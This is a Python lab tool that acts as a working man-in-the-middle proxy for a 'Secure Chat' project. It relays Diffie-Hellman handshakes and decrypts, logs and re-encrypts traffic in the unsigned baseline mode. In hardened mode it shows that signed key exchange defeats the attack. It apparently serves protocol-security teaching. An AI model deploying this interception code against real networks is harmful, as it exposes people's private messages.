"""Man-in-the-middle lab proxy for Secure Chat (for testing in an isolated lab).

Run this only between machines or VMs that you own, in your isolated lab.

It sits between a client and server.py:
  * With the client, it acts as the server (its own DH value).
  * With the real server, it acts as the client (its own DH value).
  * It decrypts traffic from each side, logs the plaintext, and re-encrypts it.

Modes:
  baseline  Matches the baseline protocol: unsigned DH, SHA-256 key, AES-CBC.
            The client has no way to detect the proxy.
  hardened  Matches the hardened protocol: signed DH, HKDF key, AES-GCM.
            The proxy cannot forge the server's RSA signature, so the client
            refuses to connect.

Example (on the attacker VM, after ARP spoofing or with the client pointed here):

    python tools/mitm_lab.py --project /path/to/SecureChat --mode baseline \
        --listen-port 8091 --log captured.jsonl

Set the client's SERVER_PORT to the listen port, or redirect port 8080 to it
with iptables (see the README).
"""

import argparse
import base64
import json
import os
import runpy
import secrets
import socket
import threading
import hashlib

from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Protocol.KDF import HKDF
from Crypto.Util.Padding import pad, unpad

LOCK = threading.Lock()


def send_line(sock, data):
    sock.sendall(base64.b64encode(data) + b"\n")


def recv_line(reader):
    line = reader.readline()
    if not line:
        return None
    return base64.b64decode(line.strip(), validate=True)


class Lab:
    def __init__(self, project, mode, log_path):
        cfg = runpy.run_path(os.path.join(project, "config.py"))
        self.p = cfg["DH_P"]
        self.g = cfg["DH_G"]
        self.width = (self.p.bit_length() + 7) // 8
        self.port = cfg["SERVER_PORT"]
        self.host = cfg["SERVER_HOST"]
        self.mode = mode
        self.log_path = log_path

    # ---- primitives matching each protocol ----
    def dh(self):
        priv = secrets.randbelow(self.p - 3) + 2
        return priv, pow(self.g, priv, self.p)

    def shared(self, priv, peer):
        return pow(peer, priv, self.p).to_bytes(self.width, "big")

    def key(self, shared, client_pub, server_pub):
        if self.mode == "baseline":
            return hashlib.sha256(shared).digest()[:32]
        w = self.width
        transcript = client_pub.to_bytes(w, "big") + server_pub.to_bytes(w, "big")
        salt = SHA256.new(transcript).digest()
        return HKDF(shared, 32, salt, SHA256, 1, context=b"SecureChat AES-256-GCM v1")

    def decrypt(self, key, blob):
        if self.mode == "baseline":
            return unpad(AES.new(key, AES.MODE_CBC, blob[:16]).decrypt(blob[16:]), 16)
        nonce, tag, ct = blob[:12], blob[-16:], blob[12:-16]
        return AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)

    def encrypt(self, key, plain):
        if self.mode == "baseline":
            iv = secrets.token_bytes(16)
            return iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plain, 16))
        nonce = secrets.token_bytes(12)
        ct, tag = AES.new(key, AES.MODE_GCM, nonce=nonce).encrypt_and_digest(plain)
        return nonce + ct + tag

    def record(self, direction, data):
        entry = {"direction": direction, "data": data}
        line = json.dumps(entry)
        print(line, flush=True)
        if self.log_path:
            with LOCK, open(self.log_path, "a", encoding="utf-8") as file:
                file.write(line + "\n")

    # ---- one client connection ----
    def handle(self, client_sock):
        creader = client_sock.makefile("rb")
        upstream = None
        try:
            hello = json.loads(recv_line(creader))
            client_pub = int(hello["dh_public"])

            # Proxy <-> client: act as the server.
            a_priv, a_pub = self.dh()
            fake = {"dh_public": str(a_pub)}

            # Proxy <-> real server: act as the client.
            upstream = socket.create_connection((self.host, self.port), timeout=10)
            ureader = upstream.makefile("rb")
            b_priv, b_pub = self.dh()
            send_line(upstream, json.dumps({"dh_public": str(b_pub)}).encode())
            s_hello = json.loads(recv_line(ureader))
            server_pub = int(s_hello["dh_public"])

            if self.mode == "hardened":
                # The proxy has no signing key. It forwards the real signature,
                # which does not cover this session's values, so the client rejects it.
                fake["signature"] = s_hello.get("signature", "")

            send_line(client_sock, json.dumps(fake).encode())

            k_client = self.key(self.shared(a_priv, client_pub), client_pub, a_pub)
            k_server = self.key(self.shared(b_priv, server_pub), b_pub, server_pub)
            self.record("info", {"status": "handshake relayed", "mode": self.mode})

            threading.Thread(target=self.pump, args=(
                creader, k_client, upstream, k_server, "client->server"
            ), daemon=True).start()
            self.pump(ureader, k_server, client_sock, k_client, "server->client")
        except Exception as error:  # the lab tool reports and moves on
            self.record("info", {"status": "stopped", "reason": str(error)})
        finally:
            client_sock.close()
            if upstream is not None:
                upstream.close()

    def pump(self, reader, in_key, out_sock, out_key, direction):
        """Read from one side, decrypt with its key, log, re-encrypt, send on."""
        try:
            while True:
                line = recv_line(reader)
                if line is None:
                    break
                plain = self.decrypt(in_key, line)
                try:
                    self.record(direction, json.loads(plain.decode("utf-8")))
                except ValueError:
                    self.record(direction, {"raw_bytes": len(plain)})
                send_line(out_sock, self.encrypt(out_key, plain))
        except Exception as error:
            self.record("info", {"status": "relay ended", "direction": direction, "reason": str(error)})
        finally:
            try:
                out_sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass


def main():
    parser = argparse.ArgumentParser(description="Secure Chat MITM lab proxy")
    parser.add_argument("--project", required=True, help="Folder with config.py of the target build")
    parser.add_argument("--mode", choices=["baseline", "hardened"], required=True)
    parser.add_argument("--listen-host", default="0.0.0.0")
    parser.add_argument("--listen-port", type=int, default=8091)
    parser.add_argument("--log", default=None, help="Optional JSON-lines capture file")
    args = parser.parse_args()

    lab = Lab(args.project, args.mode, args.log)
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((args.listen_host, args.listen_port))
    listener.listen(5)
    print(f"MITM lab proxy ({args.mode}) listening on {args.listen_port}, "
          f"forwarding to {lab.host}:{lab.port}")
    try:
        while True:
            client_sock, _ = listener.accept()
            threading.Thread(target=lab.handle, args=(client_sock,), daemon=True).start()
    except KeyboardInterrupt:
        print("Proxy stopped.")
    finally:
        listener.close()


if __name__ == "__main__":
    main()
